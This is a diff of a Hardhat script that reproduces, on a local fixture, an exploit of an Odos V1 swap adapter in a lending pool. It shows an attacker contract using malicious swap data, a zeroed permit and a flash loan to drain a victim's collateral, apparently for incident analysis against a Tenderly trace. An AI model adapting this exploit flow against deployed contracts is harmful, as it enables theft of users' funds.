@@ -5,7 +5,9 @@ import { Interface, Log, formatUnits } from "ethers";
 import { ethers } from "hardhat";
 import {
   createMaliciousSwapData,
-  deployOdosV1ExploitFixture
+  deployOdosV1ExploitFixture,
+  COLLATERAL_TO_SWAP,
+  EXTRA_COLLATERAL
 } from "../../test/dlend/adapters/odos/v1/fixtures/setup";
 import {
   TenderlyTraceResult,
@@ -216,40 +218,43 @@ async function runLocalRepro(): Promise<{
 }> {
   const fixture = await deployOdosV1ExploitFixture();
   const {
+    deployer,
     victim,
     attacker,
+    attackerBeneficiary,
+    reserveManager,
     pool,
     router,
     attackExecutor,
     adapter,
-    wfrax,
+    wstkscUsd,
     dusd,
-    aWfrax
+    aWstkscUsd
   } = fixture;
 
-  const collateralAmount = ethers.parseUnits("17509.54233", 18);
-  const dustAmount = 1n;
+  await pool
+    .connect(deployer)
+    .configureReserve(
+      await wstkscUsd.getAddress(),
+      reserveManager.address,
+      await attackExecutor.getAddress(),
+      0,
+      EXTRA_COLLATERAL
+    );
 
-  await wfrax.mint(victim.address, collateralAmount);
-  await dusd.mint(await router.getAddress(), dustAmount);
-  await dusd.mint(await attackExecutor.getAddress(), dustAmount);
-
-  await wfrax.connect(victim).approve(await pool.getAddress(), collateralAmount);
-  await pool.connect(victim).supply(await wfrax.getAddress(), collateralAmount, victim.address, 0);
-  await aWfrax.connect(victim).approve(await adapter.getAddress(), collateralAmount);
+  await aWstkscUsd.connect(victim).approve(await adapter.getAddress(), COLLATERAL_TO_SWAP);
 
   const swapData = createMaliciousSwapData(router);
   await router.setSwapBehaviour(
-    await wfrax.getAddress(),
+    await wstkscUsd.getAddress(),
     await dusd.getAddress(),
-    collateralAmount,
-    dustAmount,
+    COLLATERAL_TO_SWAP,
     false,
-    attacker.address
+    await attackExecutor.getAddress()
   );
 
   const permitInput = {
-    aToken: await aWfrax.getAddress(),
+    aToken: await aWstkscUsd.getAddress(),
     value: 0n,
     deadline: 0n,
     v: 0,
@@ -258,16 +263,18 @@ async function runLocalRepro(): Promise<{
   };
 
   const liquiditySwapParams = {
-    collateralAsset: await wfrax.getAddress(),
-    collateralAmountToSwap: collateralAmount,
-    newCollateralAsset: await dusd.getAddress(),
-    newCollateralAmount: dustAmount,
+    collateralAsset: await wstkscUsd.getAddress(),
+    collateralAmountToSwap: COLLATERAL_TO_SWAP,
+    newCollateralAsset: await wstkscUsd.getAddress(),
+    newCollateralAmount: 1n,
     user: victim.address,
-    withFlashLoan: false,
+    withFlashLoan: true,
     swapData
   };
 
-  const tx = await attackExecutor.connect(attacker).executeAttack(liquiditySwapParams, permitInput, dustAmount);
+  const tx = await attackExecutor
+    .connect(attacker)
+    .executeAttack(liquiditySwapParams, permitInput);
   const receipt = await tx.wait();
 
   if (!receipt) {
